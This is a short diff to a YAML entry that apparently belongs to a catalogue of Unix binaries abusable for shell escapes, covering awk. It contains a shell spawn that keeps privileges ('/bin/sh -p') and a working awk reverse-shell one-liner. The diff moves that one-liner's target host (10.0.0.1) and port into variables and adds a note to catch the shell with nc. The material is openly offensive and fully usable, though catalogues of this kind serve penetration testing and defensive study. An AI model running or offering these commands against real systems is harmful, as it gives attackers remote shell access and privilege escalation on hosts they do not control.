@@ -8,5 +8,8 @@ functions:
     - code: ./awk 'BEGIN {system("/bin/sh -p")}'
   reverse-shell:
     - description: Run `nc -l -p 8000` to receive the shell on the other end.
-      code: awk -v RHOST=localhost -v RPORT=8000 'BEGIN {s = "/inet/tcp/0/" RHOST "/" RPORT; while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s;}}'
+      code: |
+        RHOST=10.0.0.1
+        RPORT=8000
+        awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {s = "/inet/tcp/0/" RHOST "/" RPORT; while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s;}}'
 ---
